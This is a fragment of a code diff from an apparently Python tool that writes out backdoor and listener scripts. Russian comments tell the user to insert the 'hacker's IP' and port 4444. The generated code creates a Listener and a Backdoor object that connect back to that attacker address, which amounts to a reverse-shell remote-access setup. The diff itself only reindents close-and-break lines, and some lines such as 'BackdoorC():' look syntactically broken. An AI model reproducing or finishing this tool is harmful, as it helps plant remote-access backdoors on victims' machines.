@@ -234,8 +234,8 @@ class Listener:
 			print(result)
 my_listener = Listener('"""+str(ip)+""", 4444')  #ip  хакера и лбой порт 4444 8080 и т.д Обезательно!
 my_listener.go() """
-		n.close()
-		break
+			n.close()
+			break
 				
 		BackdoorC():
 			os.chdir('USER-BD')
@@ -275,8 +275,8 @@ class Backdoor:
 	
 my_backdoor = Backdoor("ВВедите IP", 4444) #ip хакера обезательно!
 my_backdoor.run() """
-		n.close()
-		break
+			n.close()
+			break
 				
 		if bdv1 ==1:
 			BackdoorS()
